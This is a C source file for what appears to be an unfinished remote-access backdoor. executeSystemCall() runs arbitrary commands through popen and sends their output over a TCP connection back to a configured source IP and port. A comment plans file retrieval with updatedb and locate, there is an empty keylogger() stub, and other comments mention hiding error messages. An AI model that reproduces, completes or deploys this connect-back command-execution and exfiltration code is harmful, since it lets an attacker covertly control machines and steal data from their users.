#include "functionality.h"

int sendBuffer(int socket, char *buffer, int length);
int tcpConnect();

void executeSystemCall(char *command)
{
    int socket = 0;
    char line[PATH_MAX];
    FILE *results = NULL;
    
    // Execute and open the pipe for reading
    results = popen(command, "r");
    
    // Make sure we have something yo
    if (results == NULL)
    {
        return;
    }
    
    // Open a connection back to the client
    socket = tcpConnect();
    
    // Make sure we do not receive any data
    shutdown(socket, SHUT_RD);
    
    // Read from the stream
    while (fgets(line, PATH_MAX, results) != NULL)
    {
        sendBuffer(socket, line, strlen(line));
    }
    
    pclose(results);
    close(socket);
}

/*
 First run the system command "updatedb" to build the database of all files,
 then run "locate FILENAME" and store the results in a buffer. Either we just
 take the first result, or we iterrate through all the files listed? Either way
 we open the file and send it back over to the client via SSL. Running this
 command requires the popen command. Should make use of the executeSystemCall()
 function.
*/
void retrieveFile(char *file)
{
    
    // Update the database for locate
    system("updatedb");
    
    
}

void keylogger()
{
    
}

int sendBuffer(int socket, char *buffer, int length)
{
    int sentBytes = 0;
    int bytesLeft = length;
    int temp = 0;
    
    while(sentBytes < length)
    {
        temp = send(socket, buffer + sentBytes, bytesLeft, 0);
        if (temp == -1)
            return -1;
        sentBytes += temp;
        bytesLeft -= temp;
    }
    return sentBytes;
}

int tcpConnect()
{
    int error, handle;
    struct hostent *host;
    struct sockaddr_in server;
    
    host = gethostbyaddr(SOURCE_IP, strlen(SOURCE_IP), AF_INET);
    handle = socket (AF_INET, SOCK_STREAM, 0);
    if (handle == -1)
    {
        // Should get rid of this error message
        perror ("Socket");
        handle = 0;
    }
    else
    {
        server.sin_family = AF_INET;
        server.sin_port = htons (SOURCE_PORT_INT);
        server.sin_addr = *((struct in_addr *) host->h_addr);
        bzero (&(server.sin_zero), 8);
        
        error = connect (handle, (struct sockaddr *) &server,
                         sizeof (struct sockaddr));
        if (error == -1)
        {
            // Should get rid of this error message
            perror ("Connect");
            handle = 0;
        }
    }
    
    return handle;
}

